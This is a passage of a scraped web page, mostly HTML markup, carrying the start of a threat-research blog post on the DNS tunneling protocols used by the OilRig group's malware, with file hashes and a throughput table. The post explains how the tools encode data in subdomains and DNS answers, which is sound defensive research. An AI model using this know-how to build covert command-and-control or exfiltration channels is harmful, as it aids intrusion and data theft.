blog.\r\n\r\nHelminth\r\n662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f\r\n089bf971e8839db818ac462f53f82daed523c413bfc2e01fb76dd70b37162afe\r\nd808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34\r\n1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1\r\n0ec288ac8c4aa045a45526c2939dbd843391c9c75fa4a3bcc0a6d7dc692fdcd1\r\n3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4\r\nf5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e\r\n4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281\r\n\r\nISMAgent\r\na9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821\r\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9\r\n\r\nALMA dash\r\nf37b1bbf5a07759f10e0298b861b354cee13f325bc76fbddfaacd1ea7505e111\r\n\r\nALMA dot\r\ne52b8b0e8225befec156b355b3022faf5617542b82aa54f9f42088aa05a4ec49\r\n\r\nBONDUPDATER Original\r\nde620a0511d14a2fbc9b225ebfda550973d956ab4dec7e460a42e9d2d3cf0588\r\n\r\nBONDUPDATER Updated\r\nd5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7\r\n7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00\r\n\r\nQUADAGENT\r\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"96614","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=96614' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-96614 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">DNS Tunneling in the Wild: Overview of OilRig’s DNS Tunneling</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-96614 entry-meta">
			
			
			<span class="post-views-count">43,415</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'96614','like')"><i class="ui ui-2"></i><span class="ml-5">5</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 37</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling%2F+-+DNS+Tunneling+in+the+Wild%3A+Overview+of+OilRig%E2%80%99s+DNS+Tunneling" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fdns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling%2F&title=DNS+Tunneling+in+the+Wild%3A+Overview+of+OilRig%E2%80%99s+DNS+Tunneling&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2019-04-16T16:00:12+00:00">April 16, 2019 at 9:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/alma-communicator/" rel="tag">ALMA Communicator</a>, <a href="https://unit42.paloaltonetworks.com/tag/bondupdater/" rel="tag">BONDUPDATER</a>, <a href="https://unit42.paloaltonetworks.com/tag/dns-tunneling/" rel="tag">dns tunneling</a>, <a href="https://unit42.paloaltonetworks.com/tag/helminth/" rel="tag">Helminth</a>, <a href="https://unit42.paloaltonetworks.com/tag/ismagent/" rel="tag">ISMAgent</a>, <a href="https://unit42.paloaltonetworks.com/tag/oilrig/" rel="tag">OilRig</a>, <a href="https://unit42.paloaltonetworks.com/tag/quadagent/" rel="tag">QUADAGENT</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>On March 15, Unit 42 published a blog providing an <a href="https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/">overview of DNS tunneling</a> and how malware can use DNS queries and answers to act as a command and control channel. To supplement this blog, we have decided to describe a collection of tools that rely on DNS tunneling used by an adversary known as OilRig.</p>
<p>Unit 42 has been tracking the OilRig threat group since early 2016, which has resulted in <a href="https://unit42.paloaltonetworks.com/tag/Oilrig/">over a dozen blogs</a> describing various attacks carried out by this adversary. We have been covering the various tools OilRig uses in their operations, many of which rely on DNS tunneling to communicate between infected hosts and their command and control (C2) server. The repeated use of DNS tunneling clearly represents one of their preferred communication methods; therefore, we chose to publish an overview of OilRig’s tools that use various DNS tunneling protocols. A high-level analysis of the tunneling protocols used by these tools suggests:</p>
<ul>
<li>All subdomains contain a randomly generated value to avoid the DNS query resulting in a cached response</li>
<li>Most rely on an initial handshake to obtain a unique system identifier</li>
<li>Most rely on hardcoded IP addresses within the DNS answers to start and stop data transfer</li>
<li>Data upload includes a sequence number that allows the C2 to reconstruct the uploaded data in the correct order</li>
<li>Depending on the tool, A, AAAA, and TXT query types have been used by OilRig for tunneling</li>
<li>All of the DNS tunneling protocols will generate a significant number of DNS queries</li>
</ul>
<p>This blog will dive deep into the DNS tunneling protocols used by OilRig’s tools Helminth, ISMAgent, ALMACommunicator, BONDUPDATER, and QUADAGENT. Each of these tools use DNS queries and the answers to these queries to communicate back and forth with its C2 server. Not only will this blog discuss the structure of the queries and the responses, but it will also show these protocols in action with screenshots of Wireshark displaying how the tunnels would look within a packet capture.</p>
<h1>Tool Overview</h1>
<p>OilRig delivered Trojans that use DNS tunneling for command and control in attacks since at least May 2016. Since May 2016, the threat group has introduced new tools using different tunneling protocols to their tool set. Figure 1 shows a timeline of when OilRig first used each of the 5 tools and their sub-variants in attacks, based on our visibility.</p>
<p style="text-align: center;"><img class="alignnone size-full wp-image-96617 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1.png" alt="" width="970" height="545" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1.png 970w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1-900x506.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1-300x169.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1-768x432.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure1-1-370x208.png 370w" sizes="(max-width: 970px) 100vw, 970px" /><span style="font-size: 10pt;"><em>Figure 1. Timeline of OilRig introducing DNS tunneling tools</em></span></p>
<p>Regardless of the tool, all of the DNS tunneling protocols use DNS queries to resolve specially crafted subdomains to transmit data to the C2 and the answers to these queries to receive data from the C2. Therefore, the protocols must abide by the <a href="https://www.ietf.org/rfc/rfc1035.txt">DNS protocol</a>, so the specially crafted subdomains must have labels (portions of the subdomain separated by periods) must start and end with a letter or digit, contain letters, digits and hyphens and be less than 63 characters in length. Also, the entire domain queried, which includes the C2 domain and the specially crafted subdomain cannot exceed 253 characters.</p>
<p>The protocol used by each of the five tools to communicate with its C2 via DNS tunneling differ in many ways. First, the structure of the subdomains queried that the tools use to transmit information to the C2 differ. Next, the structure of the data received by the Trojans from the C2 in the answers to the DNS queries differ as well. The structure of the subdomains used to transmit data differ dramatically, both in the amount of data included and the encoding used to represent the data. The two encoding methods used by these tools to transmit data within the subdomains included base16 and base64 encoded data. The encoding method greatly impacts the amount of data the tool is able to transmit in the subdomain of each query, as base16 requires 2 ASCII characters to represent each byte of data, so each character byte within the subdomain can transmit half (.5) a byte of data. Compare this with the use of base64 to encode the data, in which each character of base64 encoded data in the subdomain represents 6-bits (.75 bytes) of the data. This makes the base64 encoding more effective from a transmission throughput perspective.</p>
<p>The DNS query type used by the Trojan for its tunnel greatly effects the amount of data that the C2 can transmit to the Trojan for each query. For instance, the tools that issue DNS A queries transmit data via IPv4 addresses within the answers, so the C2 is only able to transmit 4-bytes per query, whereas tools using AAAA queries can transmit 16-bytes within the IPv6 answer. Table 1 shows the tools and their variants covered in this blog with a focus on the number of bytes of data the C2 can provide per query, the amount of characters used in the specially crafted subdomain, the corresponding amount of data bytes sent per query and the encoding format used to transmit the data. The table below shows that QUADAGENT can transmit the most amount of data per query, as it has 60 characters within its subdomain to transmit base64 encoded data, meaning each query can transmit 45 (60*.75 = 45) bytes of data. The table also shows that the updated version of BONDUPDATER can download the most amount of bytes per query, as the C2 can provide 186.75 bytes of data thanks to the 255-byte maximum size for TXT queries and the C2 providing base64 encoded data after a 6 character sequence number ((255-6)*.75 = 186.75), which will be discussed later in this blog.</p>
<table width="628">
<tbody>
<tr>
<td style="width: 201px; text-align: left;" colspan="2"><strong>Tool</strong></td>
<td style="width: 81px;"><strong>Bytes received per query</strong></td>
<td style="width: 108px;"><strong>Characters for data per query</strong></td>
<td style="width: 79px;"><strong>Data bytes sent per query </strong></td>
<td style="width: 125px;"><strong>Data encoding in subdomain</strong></td>
</tr>
<tr>
<td style="width: 201px;" colspan="2">Helminth</td>
<td style="width: 81px;">4</td>
<td style="width: 108px;">48</td>
<td style="width: 79px;">24</td>
<td style="width: 125px;">Base16</td>
</tr>
<tr>
<td style="width: 201px;" colspan="2">ISMAGENT</td>
<td style="width: 81px;">16</td>
<td style="width: 108px;">13</td>
<td style="width: 79px;">9.75</td>
<td style="width: 125px;">Base64</td>
</tr>
<tr>
<td style="width: 125px;" rowspan="2">ALMA</p>
<p>Communicator</td>
<td style="width: 70px;">Dash</td>
<td style="width: 81px;">4</td>
<td style="width: 108px;">20</td>
<td style="width: 79px;">10</td>
<td style="width: 125px;" rowspan="2">Base16</td>
</tr>
<tr>
